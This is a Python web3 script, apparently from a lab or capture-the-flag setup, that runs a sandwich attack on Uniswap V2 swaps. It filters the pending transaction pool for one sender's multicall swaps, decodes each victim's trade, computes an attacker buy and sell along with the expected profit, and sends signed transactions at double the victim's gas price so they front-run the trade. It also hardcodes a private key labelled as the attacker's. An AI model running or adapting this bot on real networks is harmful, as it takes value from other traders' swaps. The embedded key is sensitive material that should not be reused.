import json
import time

from web3 import Web3
from calculations import *

w3 = Web3(Web3.HTTPProvider("http://62.113.114.85/4f5d85e2-99cd-4bd7-8f38-6a438ea18d79"))
pending_filter = w3.eth.filter('pending')

uniswap_ABI = json.loads(open("../artifacts/contracts/IV2SwapRouter.sol/IV2SwapRouter.json").read())["abi"]
uniswap = w3.eth.contract(abi=uniswap_ABI)

attacker_PK = "e23362bbe82c915e22c83d520d95eb57c92b3a78f0ad373dedada5cdcf88273f"
attacker_account = w3.eth.account.privateKeyToAccount(attacker_PK)

multicall_abi = json.loads(open("../artifacts/contracts/IMulticall.sol/IMulticall.json").read())["abi"]
multicall = w3.eth.contract(address="0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45", abi=multicall_abi)

uniswap_v2_abi = json.loads(open("../artifacts/contracts/IUniswapV2Router02.sol/IUniswapV2Router02.json").read())["abi"]
uniswap_v2 = w3.eth.contract(address="0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D", abi=uniswap_v2_abi)

uniswap_v2_factory_abi = json.loads(open("../artifacts/contracts/IUniswapV2Factory.sol/IUniswapV2Factory.json").read())["abi"]
uniswap_v2_factory = w3.eth.contract(address="0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f", abi=uniswap_v2_factory_abi)

uniswap_v2_pair_abi = json.loads(open("../artifacts/contracts/IUniswapV2Pair.sol/IUniswapV2Pair.json").read())["abi"]


def attack(tx):
	print(tx)
	inp = tx["input"]
	multicall_data = multicall.decode_function_input(inp)
	print(multicall_data)
	decoded_data = uniswap.decode_function_input(multicall_data[1]["data"][0].hex())
	print(decoded_data)
	pair = uniswap_v2_factory.functions.getPair(decoded_data[1]["path"][0], decoded_data[1]["path"][1]).call()
	print(pair)
	pair_contract = w3.eth.contract(address=pair, abi=uniswap_v2_pair_abi)
	reserves = pair_contract.functions.getReserves().call()
	print(reserves)
	token0 = decoded_data[1]["path"][0]
	pair_token0 = pair_contract.functions.token0().call()
	token0_in = False
	if token0 == pair_token0:
		token0_in = True
		token1 = decoded_data[1]["path"][1]
		token0_amount = decoded_data[1]["amountIn"]
		token1_amount = decoded_data[1]["amountOutMin"]
	else:
		token0 = decoded_data[1]["path"][1]
		token1 = decoded_data[1]["path"][0]
		token0_amount = decoded_data[1]["amountOutMin"]
		token1_amount = decoded_data[1]["amountIn"]

	token0_reserve = reserves[0]
	token1_reserve = reserves[1]

	if token0_in:
		amount_out = calc_amount_out(token0_amount, token0_reserve, token1_reserve)
		slippage = 1 - token1_amount / amount_out
	else:
		amount_out = calc_amount_out(token1_amount, token1_reserve, token0_reserve)
		slippage = token0_amount / amount_out
	print(slippage)
	if token0_in:
		attacker_amount_in = calc_attack_amount_in(token0_amount, token1_amount, token0_reserve, token1_reserve)
		attacker_amount_out = int(calc_amount_out(attacker_amount_in, token0_reserve, token1_reserve) * 0.995)
		attacker_amount_in = int(calc_amount_in(attacker_amount_out, token0_reserve, token1_reserve) * 1.005)
		print("Token0 reserve", token0_reserve)
		print("Token1 reserve", token1_reserve)
		print("Attacker amount IN:", attacker_amount_in)
		print("Attacker amount OUT:", attacker_amount_out)
		revenue = int(calc_revenue(attacker_amount_in, token0_amount, attacker_amount_out, token1_amount, token0_reserve, token1_reserve))
		print("Revenue", revenue/1e18)
	else:
		attacker_amount_in = calc_attack_amount_in(token1_amount, token0_amount, token1_reserve, token0_reserve)
		attacker_amount_out = int(calc_amount_out(attacker_amount_in, token1_reserve, token0_reserve) * 0.995)
		attacker_amount_in = int(calc_amount_in(attacker_amount_out, token1_reserve, token0_reserve) * 1.005)
		print("Token0 reserve", token0_reserve)
		print("Token1 reserve", token1_reserve)
		print("Attacker amount IN:", attacker_amount_in)
		print("Attacker amount OUT:", attacker_amount_out)
		revenue = int(calc_revenue(attacker_amount_in, token1_amount, attacker_amount_out, token0_amount, token1_reserve, token0_reserve) * 0.995)
		print("Revenue", revenue/1e18)

	print("PROFIT:", (revenue - attacker_amount_in) / 1e18)

	encoded_bytes = uniswap.encodeABI(fn_name="swapTokensForExactTokens", args=[attacker_amount_out, attacker_amount_in, decoded_data[1]["path"], attacker_account.address])
	print(bytes.fromhex((encoded_bytes[2:len(encoded_bytes)])))
	multi_attack = multicall.functions.multicall(multicall_data[1]["deadline"], [bytes.fromhex((encoded_bytes[2:len(encoded_bytes)]))]).buildTransaction({
		'from': attacker_account.address,
		'nonce': w3.eth.getTransactionCount(attacker_account.address, 'pending'),
		'gas': 300000,
		'gasPrice': tx['gasPrice'] * 2,
		'value': attacker_amount_in
	})
	signed_multi_attack = attacker_account.signTransaction(multi_attack)
	tx_hash = w3.eth.sendRawTransaction(signed_multi_attack.rawTransaction)
	print("Buying: ", tx_hash.hex())
	encoded_sell = uniswap.encodeABI(fn_name="swapExactTokensForTokens", args=[attacker_amount_out, revenue, [decoded_data[1]["path"][1], decoded_data[1]["path"][0]], attacker_account.address])
	multi_sell = multicall.functions.multicall(multicall_data[1]["deadline"], [bytes.fromhex((encoded_sell[2:len(encoded_sell)]))]).buildTransaction({
		'from': attacker_account.address,
		'nonce': w3.eth.getTransactionCount(attacker_account.address, 'pending'),
		'gas': 300000,
		'gasPrice': int(tx['gasPrice'] * 0.995),
	})
	signed_multi_sell = attacker_account.signTransaction(multi_sell)
	tx_hash = w3.eth.sendRawTransaction(signed_multi_sell.rawTransaction)
	print("Selling: ", tx_hash.hex())


while True:
	for event in pending_filter.get_new_entries():
		tx = w3.eth.get_transaction(event.hex())
		if tx["from"] == "0x6408bD404C9Ba5E1021C0f863CCEaEadcB1Defb7":
			print(tx["input"][0:10])
			if tx["input"][0:10] == "0x5ae401dc":
				attack(tx)
